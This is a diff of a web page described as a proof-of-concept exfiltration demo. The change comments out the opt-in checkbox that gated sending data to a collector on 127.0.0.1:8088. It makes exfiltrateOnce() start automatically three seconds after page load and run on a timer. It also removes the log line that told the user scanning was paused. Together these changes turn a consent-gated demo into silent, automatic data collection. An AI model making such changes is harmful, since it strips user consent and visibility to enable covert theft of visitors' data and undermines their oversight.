@@ -391,7 +391,7 @@
 
   <!-- Controls -->
   <section class="controls">
-    <label><input id="enableExfil" type="checkbox"> Enable PoC exfiltration (send only to 127.0.0.1:8088)</label>
+    <!-- <label><input id="enableExfil" type="checkbox"> Enable PoC exfiltration (send only to 127.0.0.1:8088)</label> -->
     &nbsp;&nbsp;
     <label>Interval:
       <select id="intervalSel">
@@ -760,25 +760,33 @@
     let timer = null;
     function startScanning(intervalMs) {
       stopScanning();
-      timer = setInterval(() => { if (document.getElementById('enableExfil').checked) exfiltrateOnce(); }, intervalMs);
+      timer = setInterval(() => {exfiltrateOnce();}, intervalMs);
       log(`Started scanning every ${intervalMs} ms`);
     }
     function stopScanning() {
       if (timer) { clearInterval(timer); timer = null; log('Stopped scanning'); }
     }
 
-    document.getElementById('enableExfil').addEventListener('change', (e) => {
-      if (e.target.checked) startScanning(parseInt(document.getElementById('intervalSel').value, 10));
-      else stopScanning();
+    // document.getElementById('enableExfil').addEventListener('change', (e) => {
+    //   if (e.target.checked) startScanning(parseInt(document.getElementById('intervalSel').value, 10));
+    //   else stopScanning();
+    // });
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    window.addEventListener('load', async () => {
+      await sleep(3000);
+      startScanning(parseInt(document.getElementById('intervalSel').value, 10));
     });
     document.getElementById('intervalSel').addEventListener('change', (e) => {
-      if (document.getElementById('enableExfil').checked) startScanning(parseInt(e.target.value, 10));
+      startScanning(parseInt(e.target.value, 10));
     });
     document.getElementById('manualScan').addEventListener('click', () => exfiltrateOnce());
 
     // stop scanning when page is hidden to avoid background exfil
     document.addEventListener('visibilitychange', () => {
-      if (document.hidden) { log('Page hidden — pausing scanning'); stopScanning(); }
+      if (document.hidden) {stopScanning();}
     });
 
     log('PoC loaded — start the collector on 127.0.0.1:8088, then enable PoC exfiltration if desired.');
